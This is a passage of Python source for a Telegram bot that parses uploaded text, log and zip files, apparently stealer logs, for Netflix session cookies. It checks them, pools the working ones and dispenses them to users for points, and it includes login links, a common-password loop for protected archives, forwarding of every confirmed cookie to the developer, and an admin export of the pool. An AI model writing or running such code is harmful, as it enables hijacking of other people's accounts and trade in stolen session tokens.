        user_markup = InlineKeyboardMarkup()
        user_markup.row_width = 2
        user_markup.add(
            InlineKeyboardButton("💻 PC Login", url=direct_netflix_url),
            InlineKeyboardButton("📺 TV Active", url="https://www.netflix.com/tv8")
        )
        if lang == "ar":
            user_markup.add(
                InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"),
                InlineKeyboardButton("❌ لا، لم يشتغل معي", callback_data=f"fb_no_{short_id}")
            )
        else:
            user_markup.add(
                InlineKeyboardButton("✅ Yes, works perfectly", callback_data=f"fb_yes_{short_id}"),
                InlineKeyboardButton("❌ No, it's dead", callback_data=f"fb_no_{short_id}")
            )
            
        if not any(x['cookie'] == current_cookie for x in VALID_COOKIES_POOL):
            VALID_COOKIES_POOL.append({
                "cookie": current_cookie,
                "plan": fresh_result["plan"],
                "country": fresh_result["country"]
            })
        return {"status": "success", "text": success_text, "markup": user_markup}
    else:
        return execute_graded_dispense_logic(chat_id, selected_plan_prefix)

@bot.callback_query_handler(func=lambda call: call.data.startswith('grab_plan_'))
@check_ban
def handle_grab_plan_selection(call):
    chat_id = call.message.chat.id
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    selected_plan_prefix = call.data.split('_')[2]
    bot.answer_callback_query(call.id)
    
    response = execute_graded_dispense_logic(chat_id, selected_plan_prefix)
    if response["status"] == "success":
        bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
    elif response["status"] == "no_points":
        bot.send_message(chat_id, LOCALIZATION[lang]["low_points"].format(response["cost"]), reply_markup=generate_main_keyboard(chat_id))
    else:
        bot.edit_message_text(response["message"], chat_id, call.message.message_id, reply_markup=response.get("markup"))

# حلقة استقبال تفعيل اشتراك التنبيه التلقائي عند التعبئة (Stock Alert System)
@bot.callback_query_handler(func=lambda call: call.data.startswith('activate_alert_'))
@check_ban
def handle_activate_alert(call):
    chat_id = call.message.chat.id
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    plan_type = call.data.split('_')[2]
    
    ALERT_WAITING_LIST[plan_type].add(chat_id)
    bot.answer_callback_query(call.id, LOCALIZATION[lang]["notify_success"].format(plan_type), show_alert=True)
    try:
        bot.edit_message_text(LOCALIZATION[lang]["welcome_back"], chat_id, call.message.message_id, reply_markup=generate_main_keyboard(chat_id))
    except Exception:
        pass

@bot.callback_query_handler(func=lambda call: call.data == "check_pool_status")
@check_ban
def pool_status(call):
    chat_id = call.message.chat.id
    lang = USER_DATABASE[chat_id].get("lang", "ar")
    bot.answer_callback_query(call.id)
    
    basic_count = sum(1 for x in VALID_COOKIES_POOL if "Basic" in x["plan"])
    standard_count = sum(1 for x in VALID_COOKIES_POOL if "Standard" in x["plan"])
    premium_count = sum(1 for x in VALID_COOKIES_POOL if "Premium" in x["plan"])
    
    role = USER_DATABASE.get(chat_id, {}).get("role", "MEMBER")
    points = "♾️ Dev" if chat_id == DEVELOPER_CHAT_ID else ("💎 VIP Mode" if role == "VIP" else f"{USER_DATABASE.get(chat_id, {}).get('points', 5)} Pts 🪙")
    
    bot.send_message(
        chat_id, 
        LOCALIZATION[lang]["pool_view"].format(points, basic_count, standard_count, premium_count, len(VALID_COOKIES_POOL)), 
        reply_markup=generate_main_keyboard(chat_id)
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
@check_ban
def handle_user_feedback(call):
    global VALID_COOKIES_POOL
    data_parts = call.data.split('_')
    action, short_id = data_parts[1], data_parts[2]
    user_info = call.from_user
    username = f"@{user_info.username}" if user_info.username else "لا يوجد"
    chat_id = call.message.chat.id
    target_cookie = None
    for item in VALID_COOKIES_POOL:
        if item["cookie"].startswith(short_id):
            target_cookie = item["cookie"]
            break
    if action == "yes":
        bot.answer_callback_query(call.id, "🍿🔥")
        try:
            bot.edit_message_text("✅ Done!", chat_id, call.message.message_id, reply_markup=None)
        except Exception:
            pass
        if target_cookie:
            dev_log_text = f"👑 **سحب ناجح!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
            try:
                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
            except Exception:
                pass
    elif action == "no":
        if target_cookie and any(x['cookie'] == target_cookie for x in VALID_COOKIES_POOL):
            VALID_COOKIES_POOL = [x for x in VALID_COOKIES_POOL if x["cookie"] != target_cookie]
            bot.answer_callback_query(call.id, "⚠️ Removed dead account.", show_alert=True)
            try:
                bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
            except Exception:
                pass
        else:
            bot.answer_callback_query(call.id, "👌 Done")
        try:
            bot.edit_message_text("❌ Redirecting to selection...", chat_id, call.message.message_id, reply_markup=None)
        except Exception:
            pass
        open_dispense_menu(call)

def open_admin_panel_msg(chat_id):
    check_and_reset_daily_stats()
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
    markup.add(InlineKeyboardButton("📦 نسخة احتياطية للمخزن (Backup)", callback_data="admin_backup_pool"))
    markup.add(InlineKeyboardButton("🔄 تصفير الذاكرة والمكرر", callback_data="admin_clear_history"))
    
    stats_text = (
        f"👑 **مرحباً بك يا مطور البوت (فارس) في لوحتك السرية** 👑\n\n"
        f"📊 **إحصائيات البوت المتقدمة اليومية:**\n"
        f"👥 إجمالي المستخدمين المسجلين كلياً: {len(USER_DATABASE)}\n"
        f"🔥 عدد المستخدمين النشطين اليوم: {len(DAILY_STATS['active_users'])}\n"
        f"✅ عدد طلبات الفحص الناجحة اليوم: {DAILY_STATS['successful_checks']}\n"
        f"📦 إجمالي الحسابات الشغالة بالمخزن حالياً: {len(VALID_COOKIES_POOL)}\n"
        f"🚫 إجمالي المحظورين: {len(BANNED_USERS)}\n"
        f"✂️ إجمالي الكوكيز في مانع التكرار: {len(USED_COOKIES_HISTORY)}"
    )
    bot.send_message(chat_id, stats_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "open_admin_panel")
def handle_admin_click(call):
    if call.message.chat.id == DEVELOPER_CHAT_ID:
        bot.answer_callback_query(call.id)
        open_admin_panel_msg(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == "admin_backup_pool")
def handle_admin_backup(call):
    if call.message.chat.id != DEVELOPER_CHAT_ID:
        return
    bot.answer_callback_query(call.id, "⏳")
    
    if not VALID_COOKIES_POOL:
        bot.send_message(DEVELOPER_CHAT_ID, "❌ المخزن فارغ تماماً حالياً!")
        return

    backup_filename = f"Backup_Pool_{datetime.now().strftime('%Y-%m-%d_%H-%M')}.txt"
    backup_path = os.path.join(BASE_TEMP_DIR, backup_filename)
    
    try:
        with open(backup_path, 'w', encoding='utf-8') as f:
            f.write(f"=== NETFLIX COOKIES BACKUP SYSTEM (FARXES) ===\n")
            f.write(f"Total Active Accounts in Pool: {len(VALID_COOKIES_POOL)}\n")
            f.write(f"================================================\n\n")
            for index, item in enumerate(VALID_COOKIES_POOL, 1):
                f.write(f"[{index}] Plan: {item['plan']} | Country: {item['country'].upper()}\n")
                f.write(f"NetflixId={item['cookie']}\n")
                f.write(f"------------------------------------------------\n")
        
        with open(backup_path, 'rb') as doc:
            bot.send_document(DEVELOPER_CHAT_ID, doc, caption=f"📦 النسخة الاحتياطية جاهزة يا فارس! ({len(VALID_COOKIES_POOL)} كوكيز)")
        if os.path.exists(backup_path):
            os.remove(backup_path)
    except Exception as e:
        bot.send_message(DEVELOPER_CHAT_ID, f"⚠️ خطأ: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "admin_broadcast")
def start_broadcast_process(call):
    bot.answer_callback_query(call.id)
    msg = bot.send_message(DEVELOPER_CHAT_ID, "📢 أرسل لي الآن الرسالة التي تريد إذاعتها لجميع مستخدمي البوت فوراً:")
    bot.register_next_step_handler(msg, process_broadcast_sending)

def process_broadcast_sending(message):
    if message.chat.id != DEVELOPER_CHAT_ID:
        return
    broadcast_text = message.text
    sent_count = 0
    bot.send_message(DEVELOPER_CHAT_ID, "⏳ جاري بدء الإذاعة...")
    for u_id in list(USER_DATABASE.keys()):
        try:
            bot.send_message(u_id, f"📢 **إعلان من إدارة البوت:**\n\n{broadcast_text}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except Exception:
            pass
    bot.send_message(DEVELOPER_CHAT_ID, f"✅ تمت الإذاعة بنجاح! تم تسليم الرسالة إلى {sent_count} مستخدم نشط 🚀")

@bot.callback_query_handler(func=lambda call: call.data == "admin_clear_history")
def clear_history_action(call):
    global USED_COOKIES_HISTORY
    USED_COOKIES_HISTORY.clear()
    bot.answer_callback_query(call.id, "✅ تم مسح تاريخ التكرار بنجاح.", show_alert=True)

def unzip_and_extract_ids(zip_path, extract_to, password=None):
    try:
        with pyzipper.AESZipFile(zip_path) as zip_ref:
            if password:
                zip_ref.setpassword(password.encode('utf-8'))
            zip_ref.extractall(path=extract_to)
        all_cookies = []
        for root, dirs, files in os.walk(extract_to):
            for file in files:
                if file.endswith('.txt') or file.endswith('.log'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            for nid in extract_clean_netflix_ids(content):
                                if nid not in all_cookies:
                                    all_cookies.append(nid)
                    except Exception:
                        pass
        return True, all_cookies, None
    except RuntimeError as e:
        if 'encrypted' in str(e) or 'password' in str(e) or 'Bad password' in str(e):
            return False, [], "ENCRYPTED"
        return False, [], str(e)
    except Exception as e:
        return False, [], str(e)

def process_zip_entry(message, file_path, password=None, password_msg_id=None, original_name="Extracted_Archive.txt"):
    chat_id = message.chat.id
    user_work_dir = os.path.join(BASE_TEMP_DIR, f"{chat_id}_{int(time.time())}")
    if os.path.exists(user_work_dir):
        shutil.rmtree(user_work_dir)
    os.makedirs(user_work_dir)
    success, final_ids, error_type = unzip_and_extract_ids(file_path, user_work_dir, password)
    if password_msg_id:
        try:
            bot.delete_message(chat_id, password_msg_id)
        except Exception:
            pass
    if success:
        shutil.rmtree(user_work_dir)
        if os.path.exists(file_path):
            os.remove(file_path)
        process_cookies_list_and_check(chat_id, final_ids, message.message_id, source_name=original_name)
    elif error_type == "ENCRYPTED":
        if not password:
            for pwd in COMMON_PASSWORDS:
                sec_success, sec_ids, _ = unzip_and_extract_ids(file_path, user_work_dir, pwd)
                if sec_success:
                    shutil.rmtree(user_work_dir)
                    process_zip_entry(message, file_path, password=pwd, original_name=original_name)
                    return
            markup = InlineKeyboardMarkup()
            buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{file_path}_{original_name}") for pwd in COMMON_PASSWORDS]
            markup.add(*buttons)
            bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة للمتابعة أو الفك الفوري:", reply_markup=markup)
    else:
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء المعالجة: {error_type}")

@bot.message_handler(content_types=['document'])
@check_ban
def handle_incoming_document(message):
    file_name = message.document.file_name or "file.txt"
    
    # 🧼 تنظيف اسم الملف وحذف الرموز الغريبة كـ الهاشتاج لضمان بدء الفحص دون أي تهنيج (الحل الحصري لطلبك)
    clean_file_name = re.sub(r'[#\*`\[\]\s]', '_', file_name)
    
    file_name_lower = clean_file_name.lower()
    if file_name_lower.endswith('.zip'):
        file_info = bot.get_file(message.document.file_id)
        local_path = os.path.join(BASE_TEMP_DIR, f"incoming_{message.chat.id}_{int(time.time())}.zip")
        with open(local_path, 'wb') as f:
            f.write(bot.download_file(file_info.file_path))
        process_zip_entry(message, local_path, original_name=clean_file_name)
    elif file_name_lower.endswith('.txt') or file_name_lower.endswith('.log'):
        file_info = bot.get_file(message.document.file_id)
        file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(file_content), message.message_id, source_name=clean_file_name)

@bot.callback_query_handler(func=lambda call: call.data.startswith('fanal_'))
@check_ban
def handle_inline_passwords(call):
    data_parts = call.data.split('_')
    chosen_password = data_parts[1]
    remaining_parts = data_parts[2:]
    original_name = remaining_parts[-1]
    file_path = "_".join(remaining_parts[:-1])
    if os.path.exists(file_path):
        process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
def handle_stop_button(call):
    target_chat_id = int(call.data.split('_')[2])
    if target_chat_id in active_scans:
        active_scans[target_chat_id] = False
        bot.answer_callback_query(call.id, "🛑 Stopping...")
        try:
            bot.edit_message_reply_markup(target_chat_id, call.message.message_id, reply_markup=None)
        except Exception:
            pass

@bot.message_handler(func=lambda message: True)
@check_ban
def handle_plain_text(message):
    process_cookies_list_and_check(message.chat.id, extract_clean_netflix_ids(message.text), message.message_id, source_name="Direct_Text.txt")

if __name__ == "__main__":
    print("🚀 البوت يعمل الآن بكامل قوته ودعمه الثنائي للعربية والإنجليزية ونظام الـ Multi-ESN الذكي...")
    while True:
        try:
            bot.polling(none_stop=True, skip_pending=True)
        except Exception:
            time.sleep(3)
